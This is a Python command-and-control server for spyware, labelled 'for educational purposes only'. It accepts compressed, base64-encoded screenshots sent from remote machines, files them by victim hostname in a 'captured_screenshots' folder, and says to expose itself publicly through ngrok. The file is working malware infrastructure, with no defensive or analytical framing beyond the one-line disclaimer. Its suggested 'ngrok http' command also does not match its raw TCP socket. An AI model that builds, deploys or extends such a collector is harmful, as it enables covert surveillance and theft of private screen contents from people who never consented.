"""
C2 Server for receiving screenshots - FOR EDUCATIONAL PURPOSES ONLY
Run this server and use ngrok to expose it publicly
"""
import socket
import threading
import json
import time
import base64
import zlib
from datetime import datetime
import os


class ScreenshotServer:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.screenshots = []
        self.max_screenshots = 50
        self.lock = threading.Lock()

        # Create storage directory
        self.storage_dir = "captured_screenshots"
        if not os.path.exists(self.storage_dir):
            os.makedirs(self.storage_dir)

    def save_screenshot(self, data):
        """Save screenshot to file"""
        try:
            # Decode and decompress
            compressed = base64.b64decode(data['data'])
            img_data = zlib.decompress(compressed)

            # Create filename with timestamp
            timestamp = datetime.fromtimestamp(data['timestamp']).strftime('%Y%m%d_%H%M%S')
            filename = f"{self.storage_dir}/screenshot_{data['hostname']}_{timestamp}.png"

            # Save image
            with open(filename, 'wb') as f:
                f.write(img_data)

            # Store metadata
            screenshot_info = {
                'filename': filename,
                'timestamp': data['timestamp'],
                'hostname': data['hostname'],
                'size': data['size'],
                'time_str': datetime.fromtimestamp(data['timestamp']).strftime('%H:%M:%S')
            }

            with self.lock:
                self.screenshots.append(screenshot_info)
                # Keep only latest N screenshots
                if len(self.screenshots) > self.max_screenshots:
                    old = self.screenshots.pop(0)
                    # Optional: Delete old file
                    # if os.path.exists(old['filename']):
                    #     os.remove(old['filename'])

            print(f"[SERVER] Saved screenshot from {data['hostname']} at {screenshot_info['time_str']}")
            return True

        except Exception as e:
            print(f"[SERVER] Error saving screenshot: {e}")
            return False

    def handle_client(self, client_socket, address):
        """Handle incoming client connection"""
        print(f"[SERVER] Connection from {address}")

        try:
            # Receive data
            data_buffer = b""
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                data_buffer += chunk
                if b"<END>" in data_buffer:
                    break

            # Extract JSON data
            data_str = data_buffer.split(b"<END>")[0].decode('utf-8')
            screenshot_data = json.loads(data_str)

            # Save the screenshot
            self.save_screenshot(screenshot_data)

            # Send acknowledgment
            client_socket.send(b"ACK")

        except Exception as e:
            print(f"[SERVER] Error handling client {address}: {e}")
        finally:
            client_socket.close()

    def start(self):
        """Start the server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)

        print(f"[SERVER] Listening on {self.host}:{self.port}")
        print(f"[SERVER] Screenshots will be saved to: {os.path.abspath(self.storage_dir)}")
        print("[SERVER] Use 'ngrok http 9999' to expose publicly")

        try:
            while True:
                client, addr = server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client, addr)
                )
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[SERVER] Shutting down...")
        finally:
            server.close()

    def get_latest_screenshot(self):
        """Get latest screenshot info"""
        with self.lock:
            if self.screenshots:
                return self.screenshots[-1]
        return None

    def get_all_screenshots(self):
        """Get all screenshot info"""
        with self.lock:
            return self.screenshots.copy()


if __name__ == "__main__":
    server = ScreenshotServer()
    server.start()